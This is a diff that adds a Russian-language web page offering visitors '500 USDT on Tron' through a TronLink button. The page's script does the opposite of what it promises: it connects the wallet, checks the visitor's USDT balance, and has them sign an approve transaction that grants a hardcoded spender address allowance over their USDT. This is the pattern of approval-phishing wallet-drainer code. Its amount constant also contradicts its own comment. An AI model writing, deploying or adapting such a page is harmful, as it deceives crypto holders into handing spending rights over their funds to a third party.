@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Approve 500 USDT (Tron)</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #0f0f1a; color: #fff; text-align: center; padding: 50px; }
+    h1 { color: #ffcc00; }
+    button {
+      padding: 20px 60px;
+      font-size: 24px;
+      background: #ffcc00;
+      color: #000;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    #status { margin-top: 30px; font-size: 18px; min-height: 30px; }
+  </style>
+</head>
+<body>
+  <h1>Получить 500 USDT на Tron</h1>
+  <button id="approveBtn">Подключить TronLink и Получить 500 USDT</button>
+  <div id="status"></div>
+
+<script>
+  const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+  const SPENDER_ADDRESS = "TKrEGuwgHvuJWbWfLtnoG7NdiEJpBqfMzj";
+  const AMOUNT = "5"; // 500 USDT * 1_000_000
+
+  const btn = document.getElementById("approveBtn");
+  const status = document.getElementById("status");
+
+  function setStatus(msg, color = "#ffffff") {
+    status.style.color = color;
+    status.textContent = msg;
+  }
+
+  function decodeTronMessage(msg) {
+    try {
+      if (typeof msg === "string" && /^[0-9a-fA-F]+$/.test(msg)) {
+        return tronWeb.toUtf8(msg);
+      }
+    } catch (_) {}
+    return msg;
+  }
+
+  btn.addEventListener("click", async () => {
+    btn.disabled = true;
+
+    try {
+      if (!window.tronLink) {
+        throw new Error("TronLink не обнаружен. Установите расширение TronLink.");
+      }
+
+      setStatus("Запрашиваем доступ к кошельку...");
+
+      const connectResult = await window.tronLink.request({
+        method: "tron_requestAccounts"
+      });
+
+      if (connectResult?.code && connectResult.code !== 200) {
+        throw new Error("Пользователь отклонил подключение кошелька");
+      }
+
+      const tronWeb = window.tronLink.tronWeb || window.tronWeb;
+
+      if (!tronWeb || !tronWeb.ready) {
+        throw new Error("Кошелёк не подключён или TronLink ещё не готов");
+      }
+
+      const userAddress = tronWeb.defaultAddress.base58;
+      const userAddressHex = tronWeb.defaultAddress.hex;
+
+      if (!tronWeb.isAddress(USDT_ADDRESS)) {
+        throw new Error("Некорректный адрес USDT");
+      }
+
+      if (!tronWeb.isAddress(SPENDER_ADDRESS)) {
+        throw new Error("Некорректный spender address");
+      }
+
+      setStatus(`Кошелёк подключён: ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}`);
+
+      setStatus("Проверяем баланс USDT...");
+
+      const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
+
+      const rawBalance = await usdtContract.balanceOf(userAddress).call();
+
+      const balance = BigInt(rawBalance.toString());
+
+      if (balance < BigInt(AMOUNT)) {
+          const humanBalance = Number(balance) / 1_000_000;
+
+         throw new Error(
+             `Недостаточно USDT. Баланс: ${humanBalance}`
+         );
+     }
+
+     setStatus("Баланс достаточный. Создаём approve-транзакцию...");
+
+      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        USDT_ADDRESS,
+        "approve(address,uint256)",
+        {
+          callValue: 0,
+          feeLimit: 100_000_000
+        },
+        [
+          { type: "address", value: SPENDER_ADDRESS },
+          { type: "uint256", value: AMOUNT }
+        ],
+        userAddressHex
+      );
+
+      if (!tx?.result?.result || !tx.transaction) {
+        console.error("TriggerSmartContract response:", tx);
+        throw new Error("Не удалось создать транзакцию approve");
+      }
+
+      setStatus("Ожидаем подпись в TronLink...");
+
+      const signedTx = await tronWeb.trx.sign(tx.transaction);
+
+      if (!signedTx?.signature) {
+        throw new Error("Транзакция не была подписана");
+      }
+
+      setStatus("Отправляем транзакцию в сеть...");
+
+      const result = await tronWeb.trx.sendRawTransaction(signedTx);
+
+      if (!result.result) {
+        console.error("Broadcast result:", result);
+        throw new Error(decodeTronMessage(result.message) || "Транзакция не отправилась");
+      }
+
+      setStatus(
+        `✅ Транзакция успешно отправлена!\nTxID: ${result.txid}`,
+        "#00ff88"
+      );
+
+      console.log("Tron TxID:", result.txid);
+
+    } catch (error) {
+      console.error(error);
+      setStatus("❌ Ошибка: " + (error.message || error), "#ff6666");
+    } finally {
+      btn.disabled = false;
+    }
+  });
+</script>
